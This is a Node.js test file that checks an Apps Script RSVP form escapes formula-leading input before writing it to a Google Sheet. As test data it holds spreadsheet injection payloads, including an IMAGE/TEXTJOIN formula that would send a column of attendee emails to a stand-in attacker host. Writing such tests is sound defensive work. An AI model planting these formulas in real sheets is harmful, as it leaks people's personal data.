const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');

const source = fs.readFileSync(
  path.join(__dirname, '../integrations/beyond-the-tender-rsvp/Code.gs'),
  'utf8'
);

const HEADERS = [
  'Submitted at', 'Name', 'Business', 'Email', 'Attendance', 'Hotel preference',
  'Dietary / notes', 'Event', 'Source', 'GHL status', 'GHL response', 'Submission ID'
];

// Loads the real Code.gs into a sandbox with minimal Apps Script stubs and
// records every sheet write plus every GHL webhook payload.
function load(options) {
  const opts = options || {};
  const rows = [];
  const deliveryWrites = [];
  const webhookPayloads = [];

  const sheet = {
    getLastRow: function () { return rows.length + 1; },
    appendRow: function (row) { rows.push(row.slice()); },
    getRange: function (row, col, numRows, numCols) {
      return {
        getDisplayValues: function () {
          if (row === 1) return [HEADERS.slice(0, numCols)];
          const out = [];
          for (let i = 0; i < numRows; i++) {
            out.push(rows[row - 2 + i].slice(col - 1, col - 1 + numCols).map(String));
          }
          return out;
        },
        getValues: function () {
          const out = [];
          for (let i = 0; i < numRows; i++) {
            // Sheets returns stored text without the leading apostrophe.
            out.push(rows[row - 2 + i].slice(col - 1, col - 1 + numCols).map(function (v) {
              return typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v;
            }));
          }
          return out;
        },
        setValues: function (values) { deliveryWrites.push(values[0].slice()); }
      };
    }
  };

  const sandbox = {
    console: console,
    PropertiesService: {
      getScriptProperties: function () {
        return {
          getProperty: function (key) {
            return { SHEET_ID: 'sheet-id', GHL_WEBHOOK_URL: 'https://ghl.example/hook' }[key] || null;
          }
        };
      }
    },
    SpreadsheetApp: { openById: function () { return { getSheets: function () { return [sheet]; } }; } },
    LockService: { getScriptLock: function () { return { waitLock: function () {}, releaseLock: function () {} }; } },
    UrlFetchApp: {
      fetch: function (url, params) {
        webhookPayloads.push(JSON.parse(params.payload));
        return {
          getResponseCode: function () { return opts.ghlStatus || 200; },
          getContentText: function () { return opts.ghlBody || 'ok'; }
        };
      }
    },
    Utilities: { getUuid: function () { return 'uuid-' + (rows.length + 1); } },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: function (text) {
        return { text: text, setMimeType: function () { return this; } };
      }
    }
  };
  vm.createContext(sandbox);
  vm.runInContext(source, sandbox);
  return { ctx: sandbox, rows: rows, deliveryWrites: deliveryWrites, webhookPayloads: webhookPayloads };
}

function post(env, params) {
  const out = env.ctx.doPost({ parameter: params });
  return JSON.parse(out.text);
}

const EXFIL = '=IMAGE("https://evil.example/?"&TEXTJOIN(",",TRUE,D2:D300))';

test('formula-leading input is stored as literal text in the sheet', () => {
  const env = load();
  const res = post(env, {
    name: '=HYPERLINK("https://evil.example","Click")',
    company: EXFIL,
    email: 'member@example.com',
    attending: 'yes',
    room: '+SUM(1,2)',
    notes: '@INDIRECT("A1")'
  });
  assert.equal(res.ok, true);
  assert.equal(env.rows.length, 1);
  const row = env.rows[0];
  assert.equal(row[1], '\'=HYPERLINK("https://evil.example","Click")');
  assert.equal(row[2], "'" + EXFIL);
  assert.equal(row[5], "'+SUM(1,2)");
  assert.equal(row[6], '\'@INDIRECT("A1")');
});

test('minus, tab and carriage-return leading values are guarded', () => {
  const env = load();
  post(env, { name: 'Jo', company: '-2+3', email: 'jo@example.com', attending: 'no', room: '', notes: '-cmd' });
  assert.equal(env.rows[0][2], "'-2+3");
  assert.equal(env.rows[0][6], "'-cmd");
  assert.equal(env.ctx.sheetText_('\t=1+1'), "'\t=1+1");
  assert.equal(env.ctx.sheetText_('\r=1+1'), "'\r=1+1");
});

test('normal text, including an internal "=", is stored unchanged', () => {
  const env = load();
  post(env, {
    name: 'Sam Builder',
    company: 'A=B Construction Ltd',
    email: 'sam@example.com',
    attending: 'yes',
    room: 'Twin room',
    notes: 'Vegetarian, 1+1 guest'
  });
  const row = env.rows[0];
  assert.equal(row[1], 'Sam Builder');
  assert.equal(row[2], 'A=B Construction Ltd');
  assert.equal(row[3], 'sam@example.com');
  assert.equal(row[5], 'Twin room');
  assert.equal(row[6], 'Vegetarian, 1+1 guest');
  assert.equal(row[4], 'Attending');
  assert.equal(row[11], 'uuid-1');
});

test('GHL payload keeps the member original text', () => {
  const env = load();
  post(env, { name: 'Jo Smith', company: EXFIL, email: 'jo@example.com', attending: 'yes', room: '+1', notes: '@note' });
  assert.equal(env.webhookPayloads.length, 1);
  const payload = env.webhookPayloads[0];
  assert.equal(payload.companyName, EXFIL);
  assert.equal(payload.hotel_preference, '+1');
  assert.equal(payload.dietary_notes, '@note');
  assert.equal(payload.fullName, 'Jo Smith');
});

test('duplicate detection still matches on the stored email', () => {
  const env = load();
  post(env, { name: '=A1', company: '', email: 'dup@example.com', attending: 'yes' });
  const second = post(env, { name: '=A1', company: '', email: 'dup@example.com', attending: 'yes' });
  assert.equal(second.duplicate, true);
  assert.equal(env.rows.length, 1);
});

test('GHL delivery status and response text written back are guarded', () => {
  const env = load();
  env.ctx.saveRsvp_({
    timestamp: new Date(), name: 'Jo', business: '', email: 'jo@example.com',
    attendance: 'Attending', hotel: '', notes: '', event: 'beyond-the-tender-2026',
    source: 'members-page', submissionId: 'sub-1'
  });
  env.ctx.updateDelivery_('sub-1', { status: '=Sent', detail: '=HYPERLINK("x")' });
  // Copy out of the vm realm so deepEqual compares plain arrays.
  assert.deepEqual(Array.from(env.deliveryWrites[0]), ["'=Sent", '\'=HYPERLINK("x")']);
});
